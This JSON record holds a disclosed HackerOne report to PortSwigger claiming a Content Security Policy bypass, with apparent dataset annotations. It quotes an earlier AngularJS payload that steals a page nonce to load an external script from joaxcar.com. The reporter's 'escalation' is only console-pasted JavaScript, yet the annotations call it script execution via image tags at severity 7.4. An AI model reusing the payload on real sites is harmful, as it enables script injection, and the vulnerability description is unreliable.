{
    "reported_to": "PortSwigger Web Security",
    "reported_by": "priyanshusharma9789 ",
    "title": "CSP Bypass and escalation of https://hackerone.com/reports/2279346",
    "content": "\nHello Team ,\nI have gone through this report https://hackerone.com/reports/2279346 and their is CSP bypass where website has implemented security in that but after this i can escalate Again CSP bypass with using different Script .\nAs shown in https://hackerone.com/reports/2279346 report website rectify the scripts like:\ndocument.getElementsByTagName(\"div\")[0].innerHTML=`<iframe srcdoc=\"<div lang=en ng-app=application ng-csp class=ng-scope>\nCode 246 Bytes\n1<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//joaxcar.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>\n2</div>\n3\">`\nBut their is new way where i can escalate the bug with new script which is :\nvar demo=document.createElement(\"img\");\ndemo.src=\"https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg\";\ndocument.body.innerHTML=\"\";demo.width=\"1000\"; demo.height=\"1000\";\ndocument.body.appendChild(demo);\n2nd.png (F3074920)\nSteps:\nGo to https://portswigger.net/\nInject the script in console tab and see the impact\nIn this website configuration on CSP header is not proper . In my attachment their is no header for img in CSP . So attacker can escalate the bug again with different scripts.\n!st.png (F3074919)\nThanks\nPriyanshu\nImpact\nEscalate the bug with new script\nCSP bypass using img script.\n\n",
    "severity": [
        7.4,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Business Logic Errors"
    ],
    "screenshots": {},
    "disclosed_date": 1708720740,
    "report_url": "https://hackerone.com/reports/2387458",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Go to https://portswigger.net/"
        ],
        [
            2,
            "Inject the script in console tab and see the impact: `var demo=document.createElement(\"img\"); demo.src=\"https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg\"; document.body.innerHTML=\"\"; demo.width=\"1000\"; demo.height=\"1000\"; document.body.appendChild(demo);`"
        ]
    ],
    "vuln_description": "This is a CSP bypass vulnerability where the website's Content Security Policy (CSP) does not properly restrict image sources, allowing an attacker to inject and execute malicious scripts via image tags. The vulnerability escalates a previously reported issue by using a different script that leverages the lack of CSP restrictions on image sources.",
    "reason": "The attack is straightforward and involves a single component (image tag injection) without requiring complex interactions or state manipulation. The vulnerability is discovered by testing basic script injection techniques and observing CSP header misconfigurations.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": "2279346"
}